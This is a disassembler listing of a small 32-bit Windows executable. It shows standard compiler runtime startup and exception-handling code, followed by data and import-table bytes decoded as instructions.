  4018e3:	test   eax,eax
  4018e5:	je     0x401921
  4018e7:	mov    eax,DWORD PTR [eax+0x24]
  4018ea:	shr    eax,0x1f
  4018ed:	not    eax
  4018ef:	and    eax,0x1
  4018f2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4018f9:	mov    ecx,DWORD PTR [ebp-0x10]
  4018fc:	mov    DWORD PTR fs:0x0,ecx
  401903:	pop    ecx
  401904:	pop    edi
  401905:	pop    esi
  401906:	pop    ebx
  401907:	mov    esp,ebp
  401909:	pop    ebp
  40190a:	ret    
  40190b:	mov    eax,DWORD PTR [ebp-0x14]
  40190e:	mov    eax,DWORD PTR [eax]
  401910:	xor    ecx,ecx
  401912:	cmp    DWORD PTR [eax],0xc0000005
  401918:	sete   cl
  40191b:	mov    eax,ecx
  40191d:	ret    
  40191e:	mov    esp,DWORD PTR [ebp-0x18]
  401921:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401928:	xor    eax,eax
  40192a:	mov    ecx,DWORD PTR [ebp-0x10]
  40192d:	mov    DWORD PTR fs:0x0,ecx
  401934:	pop    ecx
  401935:	pop    edi
  401936:	pop    esi
  401937:	pop    ebx
  401938:	mov    esp,ebp
  40193a:	pop    ebp
  40193b:	ret    
  40193c:	int3   
  40193d:	int3   
  40193e:	int3   
  40193f:	int3   
  401940:	int3   
  401941:	int3   
  401942:	int3   
  401943:	int3   
  401944:	int3   
  401945:	int3   
  401946:	int3   
  401947:	int3   
  401948:	int3   
  401949:	int3   
  40194a:	int3   
  40194b:	int3   
  40194c:	int3   
  40194d:	int3   
  40194e:	int3   
  40194f:	int3   
  401950:	mov    edi,edi
  401952:	push   ebp
  401953:	mov    ebp,esp
  401955:	mov    eax,DWORD PTR [ebp+0x8]
  401958:	mov    ecx,0x5a4d
  40195d:	cmp    WORD PTR [eax],cx
  401960:	je     0x401966
  401962:	xor    eax,eax
  401964:	pop    ebp
  401965:	ret    
  401966:	mov    ecx,DWORD PTR [eax+0x3c]
  401969:	add    ecx,eax
  40196b:	xor    eax,eax
  40196d:	cmp    DWORD PTR [ecx],0x4550
  401973:	jne    0x401981
  401975:	mov    edx,0x10b
  40197a:	cmp    WORD PTR [ecx+0x18],dx
  40197e:	sete   al
  401981:	pop    ebp
  401982:	ret    
  401983:	int3   
  401984:	int3   
  401985:	int3   
  401986:	int3   
  401987:	int3   
  401988:	mov    edi,edi
  40198a:	push   ebp
  40198b:	mov    ebp,esp
  40198d:	sub    esp,0x14
  401990:	and    DWORD PTR [ebp-0xc],0x0
  401994:	and    DWORD PTR [ebp-0x8],0x0
  401998:	mov    eax,ds:0x402004
  40199d:	push   esi
  40199e:	push   edi
  40199f:	mov    edi,0xbb40e64e
  4019a4:	mov    esi,0xffff0000
  4019a9:	cmp    eax,edi
  4019ab:	je     0x4019ba
  4019ad:	test   esi,eax
  4019af:	je     0x4019ba
  4019b1:	not    eax
  4019b3:	mov    ds:0x402008,eax
  4019b8:	jmp    0x401a24
  4019ba:	lea    eax,[ebp-0xc]
  4019bd:	push   eax
  4019be:	call   DWORD PTR ds:0x403044
  4019c4:	mov    eax,DWORD PTR [ebp-0x8]
  4019c7:	xor    eax,DWORD PTR [ebp-0xc]
  4019ca:	mov    DWORD PTR [ebp-0x4],eax
  4019cd:	call   DWORD PTR ds:0x40302c
  4019d3:	xor    DWORD PTR [ebp-0x4],eax
  4019d6:	call   DWORD PTR ds:0x403028
  4019dc:	xor    DWORD PTR [ebp-0x4],eax
  4019df:	call   DWORD PTR ds:0x403048
  4019e5:	xor    eax,DWORD PTR [ebp-0x4]
  4019e8:	lea    ecx,[ebp-0x4]
  4019eb:	xor    eax,ecx
  4019ed:	mov    DWORD PTR [ebp-0x4],eax
  4019f0:	lea    eax,[ebp-0x14]
  4019f3:	push   eax
  4019f4:	call   DWORD PTR ds:0x403034
  4019fa:	mov    eax,DWORD PTR [ebp-0x10]
  4019fd:	xor    eax,DWORD PTR [ebp-0x14]
  401a00:	mov    ecx,DWORD PTR [ebp-0x4]
  401a03:	xor    ecx,eax
  401a05:	cmp    ecx,edi
  401a07:	je     0x401a11
  401a09:	test   DWORD PTR ds:0x402004,esi
  401a0f:	jne    0x401a16
  401a11:	mov    ecx,0xbb40e64f
  401a16:	mov    DWORD PTR ds:0x402004,ecx
  401a1c:	not    ecx
  401a1e:	mov    DWORD PTR ds:0x402008,ecx
  401a24:	pop    edi
  401a25:	pop    esi
  401a26:	mov    esp,ebp
  401a28:	pop    ebp
  401a29:	ret    
  401a2a:	int3   
  401a2b:	int3   
  401a2c:	int3   
  401a2d:	int3   
  401a2e:	int3   
  401a2f:	push   0x30000
  401a34:	push   0x10000
  401a39:	call   DWORD PTR ds:0x403054
  401a3f:	pop    ecx
  401a40:	pop    ecx
  401a41:	ret    
  401a42:	int3   
  401a43:	int3   
  401a44:	int3   
  401a45:	int3   
  401a46:	int3   
  401a47:	int3   
  401a48:	jmp    DWORD PTR ds:0x403060
  401a4e:	int3   
  401a4f:	int3   
  401a50:	int3   
  401a51:	int3   
  401a52:	int3   
  401a53:	int3   
  401a54:	push   0x401ab0
  401a59:	push   DWORD PTR fs:0x0
  401a60:	mov    eax,DWORD PTR [esp+0x10]
  401a64:	mov    DWORD PTR [esp+0x10],ebp
  401a68:	lea    ebp,[esp+0x10]
  401a6c:	sub    esp,eax
  401a6e:	push   ebx
  401a6f:	push   esi
  401a70:	push   edi
  401a71:	mov    eax,ds:0x402004
  401a76:	xor    DWORD PTR [ebp-0x4],eax
  401a79:	xor    eax,ebp
  401a7b:	mov    DWORD PTR [ebp-0x1c],eax
  401a7e:	push   eax
  401a7f:	mov    DWORD PTR [ebp-0x18],esp
  401a82:	push   DWORD PTR [ebp-0x8]
  401a85:	mov    eax,DWORD PTR [ebp-0x4]
  401a88:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401a8f:	mov    DWORD PTR [ebp-0x8],eax
  401a92:	lea    eax,[ebp-0x10]
  401a95:	mov    fs:0x0,eax
  401a9b:	ret    
  401a9c:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a9f:	xor    ecx,ebp
  401aa1:	call   0x4016d0
  401aa6:	jmp    0x401c71
  401aab:	int3   
  401aac:	int3   
  401aad:	int3   
  401aae:	int3   
  401aaf:	int3   
  401ab0:	mov    edi,edi
  401ab2:	push   ebp
  401ab3:	mov    ebp,esp
  401ab5:	push   DWORD PTR [ebp+0x14]
  401ab8:	push   DWORD PTR [ebp+0x10]
  401abb:	push   DWORD PTR [ebp+0xc]
  401abe:	push   DWORD PTR [ebp+0x8]
  401ac1:	push   0x4016d0
  401ac6:	push   0x402004
  401acb:	call   0x401c8a
  401ad0:	add    esp,0x18
  401ad3:	pop    ebp
  401ad4:	ret    
  401ad5:	int3   
  401ad6:	int3   
  401ad7:	int3   
  401ad8:	int3   
  401ad9:	int3   
  401ada:	int3   
  401adb:	int3   
  401adc:	int3   
  401add:	int3   
  401ade:	int3   
  401adf:	int3   
  401ae0:	ret    
  401ae1:	int3   
  401ae2:	int3   
  401ae3:	int3   
  401ae4:	int3   
  401ae5:	int3   
  401ae6:	mov    edi,edi
  401ae8:	push   ebp
  401ae9:	mov    ebp,esp
  401aeb:	push   0x0
  401aed:	call   DWORD PTR ds:0x40300c
  401af3:	push   DWORD PTR [ebp+0x8]
  401af6:	call   DWORD PTR ds:0x403008
  401afc:	push   0xc0000409
  401b01:	call   DWORD PTR ds:0x403024
  401b07:	push   eax
  401b08:	call   DWORD PTR ds:0x403020
  401b0e:	pop    ebp
  401b0f:	ret    
  401b10:	int3   
  401b11:	int3   
  401b12:	int3   
  401b13:	int3   
  401b14:	int3   
  401b15:	mov    edi,edi
  401b17:	push   ebp
  401b18:	mov    ebp,esp
  401b1a:	sub    esp,0x324
  401b20:	mov    ds:0x402140,eax
  401b25:	mov    DWORD PTR ds:0x40213c,ecx
  401b2b:	mov    DWORD PTR ds:0x402138,edx
  401b31:	mov    DWORD PTR ds:0x402134,ebx
  401b37:	mov    DWORD PTR ds:0x402130,esi
  401b3d:	mov    DWORD PTR ds:0x40212c,edi
  401b43:	data16 mov WORD PTR ds:0x402158,ss
  401b4a:	data16 mov WORD PTR ds:0x40214c,cs
  401b51:	data16 mov WORD PTR ds:0x402128,ds
  401b58:	data16 mov WORD PTR ds:0x402124,es
  401b5f:	data16 mov WORD PTR ds:0x402120,fs
  401b66:	data16 mov WORD PTR ds:0x40211c,gs
  401b6d:	pushf  
  401b6e:	pop    DWORD PTR ds:0x402150
  401b74:	mov    eax,DWORD PTR [ebp+0x0]
  401b77:	mov    ds:0x402144,eax
  401b7c:	mov    eax,DWORD PTR [ebp+0x4]
  401b7f:	mov    ds:0x402148,eax
  401b84:	lea    eax,[ebp+0x8]
  401b87:	mov    ds:0x402154,eax
  401b8c:	mov    eax,DWORD PTR [ebp-0x324]
  401b92:	mov    DWORD PTR ds:0x402090,0x10001
  401b9c:	mov    eax,ds:0x402148
  401ba1:	mov    ds:0x40204c,eax
  401ba6:	mov    DWORD PTR ds:0x402040,0xc0000409
  401bb0:	mov    DWORD PTR ds:0x402044,0x1
  401bba:	mov    DWORD PTR ds:0x402050,0x3
  401bc4:	push   0x4
  401bc6:	pop    eax
  401bc7:	imul   eax,eax,0x0
  401bca:	mov    DWORD PTR [eax+0x402054],0x2
  401bd4:	push   0x4
  401bd6:	pop    eax
  401bd7:	shl    eax,0x0
  401bda:	mov    ecx,DWORD PTR ds:0x402004
  401be0:	mov    DWORD PTR [eax+0x402054],ecx
  401be6:	push   0x4
  401be8:	pop    eax
  401be9:	shl    eax,1
  401beb:	mov    ecx,DWORD PTR ds:0x402008
  401bf1:	mov    DWORD PTR [eax+0x402054],ecx
  401bf7:	push   0x4
  401bf9:	pop    eax
  401bfa:	imul   eax,eax,0x0
  401bfd:	mov    ecx,DWORD PTR ds:0x402004
  401c03:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c07:	push   0x4
  401c09:	pop    eax
  401c0a:	shl    eax,0x0
  401c0d:	mov    ecx,DWORD PTR ds:0x402008
  401c13:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c17:	push   0x401040
  401c1c:	call   0x401ae6
  401c21:	mov    esp,ebp
  401c23:	pop    ebp
  401c24:	ret    
  401c25:	int3   
  401c26:	int3   
  401c27:	int3   
  401c28:	int3   
  401c29:	int3   
  401c2a:	int3   
  401c2b:	int3   
  401c2c:	push   0x401ab0
  401c31:	push   DWORD PTR fs:0x0
  401c38:	mov    eax,DWORD PTR [esp+0x10]
  401c3c:	mov    DWORD PTR [esp+0x10],ebp
  401c40:	lea    ebp,[esp+0x10]
  401c44:	sub    esp,eax
  401c46:	push   ebx
  401c47:	push   esi
  401c48:	push   edi
  401c49:	mov    eax,ds:0x402004
  401c4e:	xor    DWORD PTR [ebp-0x4],eax
  401c51:	xor    eax,ebp
  401c53:	push   eax
  401c54:	mov    DWORD PTR [ebp-0x18],esp
  401c57:	push   DWORD PTR [ebp-0x8]
  401c5a:	mov    eax,DWORD PTR [ebp-0x4]
  401c5d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401c64:	mov    DWORD PTR [ebp-0x8],eax
  401c67:	lea    eax,[ebp-0x10]
  401c6a:	mov    fs:0x0,eax
  401c70:	ret    
  401c71:	mov    ecx,DWORD PTR [ebp-0x10]
  401c74:	mov    DWORD PTR fs:0x0,ecx
  401c7b:	pop    ecx
  401c7c:	pop    edi
  401c7d:	pop    edi
  401c7e:	pop    esi
  401c7f:	pop    ebx
  401c80:	mov    esp,ebp
  401c82:	pop    ebp
  401c83:	push   ecx
  401c84:	ret    
  401c85:	int3   
  401c86:	int3   
  401c87:	int3   
  401c88:	int3   
  401c89:	int3   
  401c8a:	jmp    DWORD PTR ds:0x403050
  401c90:	in     al,0xff
  401c92:	(bad)  
  401c93:	inc    DWORD PTR [eax]
  401c95:	add    BYTE PTR [eax],al
  401c97:	add    BYTE PTR [edi+edi*8+0xffff],al
  401c9e:	add    BYTE PTR [eax],al
  401ca0:	(bad)  
  401ca1:	(bad)  
  401ca2:	(bad)  
  401ca3:	inc    DWORD PTR [esi+0x16]
  401ca6:	inc    eax
  401ca7:	add    BYTE PTR [edx+0x16],cl
  401caa:	inc    eax
  401cab:	add    dh,bh
  401cad:	(bad)  
  401cae:	(bad)  
  401caf:	(bad)  
  401cb0:	cli    
  401cb1:	adc    eax,0x160e0040
  401cb6:	inc    eax
  401cb7:	add    dh,bh
  401cb9:	(bad)  
  401cba:	(bad)  
  401cbb:	inc    DWORD PTR [eax]
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    ah,dl
  401cc1:	(bad)  
  401cc2:	(bad)  
  401cc3:	inc    DWORD PTR [eax]
  401cc5:	add    BYTE PTR [eax],al
  401cc7:	add    dh,bh
  401cc9:	(bad)  
  401cca:	(bad)  
  401ccb:	jmp    FWORD PTR [edi+edx*1+0x17b00040]
  401cd2:	inc    eax
  401cd3:	add    BYTE PTR [eax],al
  401cd5:	add    BYTE PTR [eax],al
  401cd7:	add    dh,bh
  401cd9:	(bad)  
  401cda:	(bad)  
  401cdb:	inc    DWORD PTR [eax]
  401cdd:	add    BYTE PTR [eax],al
  401cdf:	add    al,bl
  401ce1:	(bad)  
  401ce2:	(bad)  
  401ce3:	inc    DWORD PTR [eax]
  401ce5:	add    BYTE PTR [eax],al
  401ce7:	add    dh,bh
  401ce9:	(bad)  
  401cea:	(bad)  
  401ceb:	dec    DWORD PTR [ebx]
  401ced:	sbb    DWORD PTR [eax+0x0],eax
  401cf0:	push   ds
  401cf1:	sbb    DWORD PTR [eax+0x0],eax

Disassembly of section .data:

00402000 <.data>:
  402000:	add    DWORD PTR [eax],eax
  402002:	add    BYTE PTR [eax],al
  402004:	dec    esi
  402005:	out    0x40,al
  402007:	mov    ebx,0x44bf19b1
	...

Disassembly of section .idata:

00403000 <.idata>:
  403000:	ret    0x32
  403003:	add    BYTE PTR [eax],al
  403005:	add    BYTE PTR [eax],al
  403007:	add    BYTE PTR [edx-0x7ffffcd],bl
  40300d:	xor    al,BYTE PTR [eax]
  40300f:	add    BYTE PTR [eax],al
  403011:	add    BYTE PTR [eax],al
  403013:	add    BYTE PTR [esi],dl
  403015:	xor    eax,DWORD PTR [eax]
  403017:	add    BYTE PTR [eax],al
  403019:	add    BYTE PTR [eax],al
  40301b:	add    dh,ah
  40301d:	xor    al,BYTE PTR [eax]
  40301f:	add    dl,cl
  403021:	xor    eax,DWORD PTR [eax]
  403023:	add    BYTE PTR [esi+0x5a000033],dh
  403029:	xor    eax,DWORD PTR [eax]
  40302b:	add    BYTE PTR [ebx+esi*1+0x0],al
  40302f:	add    BYTE PTR [eax],al
  403031:	add    BYTE PTR [eax],al
  403033:	add    BYTE PTR [edx],ch
  403035:	xor    eax,DWORD PTR [eax]
  403037:	add    BYTE PTR [eax],al
  403039:	add    BYTE PTR [eax],al
  40303b:	add    dh,bl
  40303d:	xor    al,BYTE PTR [eax]
  40303f:	add    BYTE PTR [eax],al
  403041:	add    BYTE PTR [eax],al
  403043:	add    BYTE PTR [eax+0x33],dh
  403046:	add    BYTE PTR [eax],al
  403048:	mov    dh,BYTE PTR [ebx]
  40304a:	add    BYTE PTR [eax],al
  40304c:	add    BYTE PTR [eax],al
  40304e:	add    BYTE PTR [eax],al
  403050:	test   al,0x32
  403052:	add    BYTE PTR [eax],al
  403054:	call   0x32:0x7a000032
  40305b:	add    BYTE PTR [eax+0x32],dh
  40305e:	add    BYTE PTR [eax],al
  403060:	xor    al,BYTE PTR fs:[eax]
  403063:	add    BYTE PTR [eax+0x32],dl
  403066:	add    BYTE PTR [eax],al
  403068:	inc    edx
  403069:	xor    al,BYTE PTR [eax]
  40306b:	add    BYTE PTR [eax],bh
  40306d:	xor    al,BYTE PTR [eax]
  40306f:	add    BYTE PTR [eax],dh
  403071:	xor    al,BYTE PTR [eax]
  403073:	add    BYTE PTR [eax],ch
  403075:	xor    al,BYTE PTR [eax]
  403077:	add    BYTE PTR [esi],dl
  403079:	xor    al,BYTE PTR [eax]
  40307b:	add    BYTE PTR [edx+esi*1],al
  40307e:	add    BYTE PTR [eax],al
  403080:	div    BYTE PTR [ecx]
  403082:	add    BYTE PTR [eax],al
  403084:	out    0x31,al
  403086:	add    BYTE PTR [eax],al
  403088:	fdiv   DWORD PTR [ecx]
  40308a:	add    BYTE PTR [eax],al
  40308c:	add    BYTE PTR [eax],al
  40308e:	add    BYTE PTR [eax],al
  403090:	loopne 0x4030ac
  403092:	inc    eax
  403093:	add    BYTE PTR [eax+0x31],bl
  403099:	add    BYTE PTR [eax],al
  40309b:	add    BYTE PTR [eax],al
  40309d:	add    BYTE PTR [eax],al
  40309f:	add    BYTE PTR [esi+0x50000032],cl
  4030a5:	xor    BYTE PTR [eax],al
  4030a7:	add    BYTE PTR [eax+0x31],cl
	...
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	aam    0x32
  4030b6:	add    BYTE PTR [eax],al
  4030b8:	add    BYTE PTR [eax],dh
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	test   BYTE PTR [ecx],dh
	...
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	fidiv  WORD PTR [ebx]
  4030ca:	add    BYTE PTR [eax],al
  4030cc:	cmp    al,0x30
  4030ce:	add    BYTE PTR [eax],al
  4030d0:	xor    DWORD PTR fs:[eax],eax
	...
  4030db:	add    BYTE PTR [eax],al
  4030dd:	xor    al,0x0
  4030df:	add    BYTE PTR [eax+esi*1],bl
  4030e2:	add    BYTE PTR [eax],al
  4030e4:	push   eax
  4030e5:	xor    DWORD PTR [eax],eax
	...
  4030ef:	add    BYTE PTR [edx],ch
  4030f1:	xor    al,0x0
  4030f3:	add    BYTE PTR [eax],cl
  4030f5:	xor    BYTE PTR [eax],al
  4030f7:	add    BYTE PTR [ecx+esi*1+0x0],bl
	...
  403103:	add    BYTE PTR [esp+esi*1+0x0],dl
  403107:	add    BYTE PTR [eax+esi*1],dl
  40310a:	add    BYTE PTR [eax],al
  40310c:	jl     0x40313f
	...
  403116:	add    BYTE PTR [eax],al
  403118:	jle    0x40314e
  40311a:	add    BYTE PTR [eax],al
  40311c:	xor    al,0x30
  40311e:	add    BYTE PTR [eax],al
  403120:	mov    WORD PTR [ecx],?
	...
  40312a:	add    BYTE PTR [eax],al
  40312c:	mov    ds:0x44000034,al
  403131:	xor    BYTE PTR [eax],al
	...
  403147:	add    dl,al
  403149:	xor    al,BYTE PTR [eax]
  40314b:	add    BYTE PTR [eax],al
  40314d:	add    BYTE PTR [eax],al
  40314f:	add    BYTE PTR [edx-0x7ffffcd],bl
  403155:	xor    al,BYTE PTR [eax]
  403157:	add    BYTE PTR [eax],al
  403159:	add    BYTE PTR [eax],al
  40315b:	add    BYTE PTR [esi],dl
  40315d:	xor    eax,DWORD PTR [eax]
  40315f:	add    BYTE PTR [eax],al
  403161:	add    BYTE PTR [eax],al
  403163:	add    dh,ah
  403165:	xor    al,BYTE PTR [eax]
  403167:	add    dl,cl
  403169:	xor    eax,DWORD PTR [eax]
  40316b:	add    BYTE PTR [esi+0x5a000033],dh
  403171:	xor    eax,DWORD PTR [eax]
  403173:	add    BYTE PTR [ebx+esi*1+0x0],al
  403177:	add    BYTE PTR [eax],al
  403179:	add    BYTE PTR [eax],al
  40317b:	add    BYTE PTR [edx],ch
  40317d:	xor    eax,DWORD PTR [eax]
  40317f:	add    BYTE PTR [eax],al
  403181:	add    BYTE PTR [eax],al
  403183:	add    dh,bl
  403185:	xor    al,BYTE PTR [eax]
  403187:	add    BYTE PTR [eax],al
  403189:	add    BYTE PTR [eax],al
  40318b:	add    BYTE PTR [eax+0x33],dh
  40318e:	add    BYTE PTR [eax],al
  403190:	mov    dh,BYTE PTR [ebx]
  403192:	add    BYTE PTR [eax],al
  403194:	add    BYTE PTR [eax],al
  403196:	add    BYTE PTR [eax],al
  403198:	test   al,0x32
  40319a:	add    BYTE PTR [eax],al
  40319c:	call   0x32:0x7a000032
  4031a3:	add    BYTE PTR [eax+0x32],dh
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	xor    al,BYTE PTR fs:[eax]
  4031ab:	add    BYTE PTR [eax+0x32],dl
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	inc    edx
  4031b1:	xor    al,BYTE PTR [eax]
  4031b3:	add    BYTE PTR [eax],bh
  4031b5:	xor    al,BYTE PTR [eax]
  4031b7:	add    BYTE PTR [eax],dh
  4031b9:	xor    al,BYTE PTR [eax]
  4031bb:	add    BYTE PTR [eax],ch
  4031bd:	xor    al,BYTE PTR [eax]
  4031bf:	add    BYTE PTR [esi],dl
  4031c1:	xor    al,BYTE PTR [eax]
  4031c3:	add    BYTE PTR [edx+esi*1],al
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	div    BYTE PTR [ecx]
  4031ca:	add    BYTE PTR [eax],al
  4031cc:	out    0x31,al
  4031ce:	add    BYTE PTR [eax],al
  4031d0:	fdiv   DWORD PTR [ecx]
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	add    BYTE PTR [eax],al
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	outs   dx,DWORD PTR ds:[esi]
  4031d9:	add    BYTE PTR [edi+0x58],bl
  4031dc:	arpl   WORD PTR [eax+0x74],si
  4031df:	inc    esi
  4031e0:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  4031e8:	pop    edi
  4031e9:	pop    edi
  4031ea:	jo     0x40324b
  4031ec:	pop    edi
  4031ed:	arpl   WORD PTR [edi+0x6d],bp
  4031f0:	ins    DWORD PTR es:[edi],dx
  4031f1:	outs   dx,DWORD PTR ds:[esi]
  4031f2:	fs add BYTE PTR gs:[eax],al
  4031f6:	adc    DWORD PTR [ecx],eax
  4031f8:	pop    edi
  4031f9:	popa   
  4031fa:	ins    DWORD PTR es:[edi],dx
  4031fb:	jae    0x403264
  4031fd:	pop    edi
  4031fe:	gs js  0x40326a
  403201:	je     0x403203
  403203:	add    cl,dh
  403205:	add    BYTE PTR [edi+0x5f],bl
  403208:	ja     0x403271
  40320a:	gs je  0x40327a
  40320d:	popa   
  40320e:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  403215:	add    dl,ah
  403217:	add    BYTE PTR [edi+0x5f],bl
  40321a:	jae    0x403281
  40321c:	je     0x40327d
  40321e:	popa   
  40321f:	jo     0x403291
  403221:	pop    edi
  403222:	je     0x40329d
  403224:	jo     0x40328b
  403226:	add    BYTE PTR [eax],al
  403228:	scas   al,BYTE PTR es:[edi]
  403229:	add    al,0x65
  40322b:	js     0x403296
  40322d:	je     0x40322f
  40322f:	add    BYTE PTR [ebx+0x1],dh
  403232:	pop    edi
  403233:	gs js  0x40329f
  403236:	je     0x403238
  403238:	and    al,0x1
  40323a:	pop    edi
  40323b:	arpl   WORD PTR [ebp+0x78],sp
  40323e:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  403246:	jo     0x4032a7
  403248:	pop    edi
  403249:	ins    WORD PTR es:[edi],dx
  40324b:	outs   dx,DWORD PTR ds:[esi]
  40324c:	fs add BYTE PTR gs:[eax],al
  403250:	in     al,0x0
  403252:	pop    edi
  403253:	pop    edi
  403254:	jae    0x4032bb
  403256:	je     0x4032cd
  403258:	jae    0x4032bf
  40325a:	jb     0x4032c9
  40325c:	popa   
  40325d:	je     0x4032c7
  40325f:	gs jb  0x4032d4
  403262:	add    BYTE PTR [eax],al
  403264:	call   0x6ea9916a
  403269:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  403271:	add    al,0x5f
  403273:	ja     0x4032d8
  403275:	ins    DWORD PTR es:[edi],dx
  403276:	fs ins BYTE PTR es:[edi],dx
  403278:	outs   dx,BYTE PTR ds:[esi]
  403279:	add    BYTE PTR ds:0x65743f00,dh
  40327f:	jb     0x4032ee
  403281:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  403288:	pop    ecx
  403289:	inc    ecx
  40328a:	pop    eax
  40328b:	pop    eax
  40328c:	pop    edx
  40328d:	add    BYTE PTR [ebp+0x73],ch
  403290:	jbe    0x4032f5
  403292:	jb     0x403308
  403294:	cs fs ins BYTE PTR es:[edi],dx
  403297:	ins    BYTE PTR es:[edi],dx
  403298:	add    BYTE PTR [eax],al
  40329a:	aaa    
  40329b:	add    DWORD PTR [edi+0x63],ebx
  40329e:	outs   dx,DWORD PTR ds:[esi]
  40329f:	outs   dx,BYTE PTR ds:[esi]
  4032a0:	je     0x403314
  4032a2:	outs   dx,DWORD PTR ds:[esi]
  4032a3:	ins    BYTE PTR es:[edi],dx
  4032a4:	data16 jo 0x4032a7
  4032a7:	add    BYTE PTR [edx+0x1],ch
  4032aa:	pop    edi
  4032ab:	gs js  0x403311
  4032ae:	gs jo  0x403325
  4032b1:	pop    edi
  4032b2:	push   0x6c646e61
  4032b7:	gs jb  0x4032ee
  4032ba:	pop    edi
  4032bb:	arpl   WORD PTR [edi+0x6d],bp
  4032be:	ins    DWORD PTR es:[edi],dx
  4032bf:	outs   dx,DWORD PTR ds:[esi]
  4032c0:	outs   dx,BYTE PTR ds:[esi]
  4032c1:	add    BYTE PTR [eax],al
  4032c3:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4032c7:	jo     0x403335
  4032c9:	popa   
  4032ca:	jns    0x40331f
  4032cc:	pop    ecx
  4032cd:	push   ebx
  4032ce:	inc    esp
  4032cf:	dec    ebp
  4032d0:	inc    ebx
  4032d1:	push   eax
  4032d2:	dec    esp
  4032d3:	add    BYTE PTR [ebx+0x59],dl
  4032d6:	push   ebx
  4032d7:	inc    esp
  4032d8:	dec    ebp
  4032d9:	cs inc ebx
  4032db:	push   eax
  4032dc:	dec    esp
  4032dd:	add    BYTE PTR ds:0x656c5300,ch
  4032e3:	gs jo  0x4032e6
  4032e6:	and    BYTE PTR [eax],al
  4032e8:	inc    edi
  4032e9:	gs je  0x40333f
  4032ec:	je     0x40334f
  4032ee:	jb     0x403364
  4032f0:	jne    0x403362
  4032f2:	dec    ecx
  4032f3:	outs   dx,BYTE PTR ds:[esi]
  4032f4:	outs   dx,WORD PTR ds:[esi]
  4032f6:	push   edi
  4032f7:	add    BYTE PTR [edi],cl
  4032f9:	add    BYTE PTR [ebx+0x65],dl
  4032fc:	je     0x403353
  4032fe:	outs   dx,BYTE PTR ds:[esi]
  4032ff:	push   0x6c646e61
  403304:	gs fs inc ebp
  403307:	js     0x40336c
  403309:	gs jo  0x403380
  40330c:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  403313:	gs jb  0x403316
  403316:	adc    BYTE PTR [eax],al
  403318:	inc    edi
  403319:	gs je  0x403369
  40331c:	outs   dx,DWORD PTR ds:[esi]
  40331d:	fs jne 0x40338c
  403320:	gs dec eax
  403322:	popa   
  403323:	outs   dx,BYTE PTR ds:[esi]
  403324:	fs ins BYTE PTR es:[edi],dx
  403326:	gs inc ecx
  403328:	add    BYTE PTR [eax],al
  40332a:	add    BYTE PTR [eax],al
  40332c:	push   ecx
  40332d:	jne    0x403394
  40332f:	jb     0x4033aa
  403331:	push   eax
  403332:	gs jb  0x40339b
  403335:	outs   dx,DWORD PTR ds:[esi]
  403336:	jb     0x4033a5
  403338:	popa   
  403339:	outs   dx,BYTE PTR ds:[esi]
  40333a:	arpl   WORD PTR [ebp+0x43],sp
  40333d:	outs   dx,DWORD PTR ds:[esi]
  40333e:	jne    0x4033ae
  403340:	je     0x4033a7
  403342:	jb     0x403344
  403344:	or     eax,0x74654700
  403349:	inc    ebx
  40334a:	jne    0x4033be
  40334c:	jb     0x4033b3
  40334e:	outs   dx,BYTE PTR ds:[esi]
  40334f:	je     0x4033a1
  403351:	jb     0x4033c2
  403353:	arpl   WORD PTR [ebp+0x73],sp
  403356:	jae    0x4033a1
  403358:	add    BYTE PTR fs:[ecx],dl
  40335b:	add    BYTE PTR [edi+0x65],al
  40335e:	je     0x4033a3
  403360:	jne    0x4033d4
  403362:	jb     0x4033c9
  403364:	outs   dx,BYTE PTR ds:[esi]
  403365:	je     0x4033bb
  403367:	push   0x64616572
  40336c:	dec    ecx
  40336d:	add    BYTE PTR fs:[eax],al
  403370:	adc    al,0x0
  403372:	inc    edi
  403373:	gs je  0x4033c9
  403376:	jns    0x4033eb
  403378:	je     0x4033df
  40337a:	ins    DWORD PTR es:[edi],dx
  40337b:	push   esp
  40337c:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  403383:	ins    BYTE PTR es:[edi],dx
  403384:	gs push esp
  403386:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  40338d:	gs je  0x4033e4
  403390:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  403397:	je     0x403399
  403399:	add    BYTE PTR [ecx],dl
  40339b:	add    BYTE PTR [ebp+0x6e],dl
  40339e:	push   0x6c646e61
  4033a3:	gs fs inc ebp
  4033a6:	js     0x40340b
  4033a8:	gs jo  0x40341f
  4033ab:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  4033b2:	gs jb  0x4033b5
  4033b5:	add    BYTE PTR [eax+eax*1],cl
  4033b8:	inc    edi
  4033b9:	gs je  0x4033ff
  4033bc:	jne    0x403430
  4033be:	jb     0x403425
  4033c0:	outs   dx,BYTE PTR ds:[esi]
  4033c1:	je     0x403413
  4033c3:	jb     0x403434
  4033c5:	arpl   WORD PTR [ebp+0x73],sp
  4033c8:	jae    0x4033ca
  4033ca:	dec    ebx
  4033cb:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  4033cf:	ins    DWORD PTR es:[edi],dx
  4033d0:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  4033d7:	outs   dx,DWORD PTR ds:[esi]
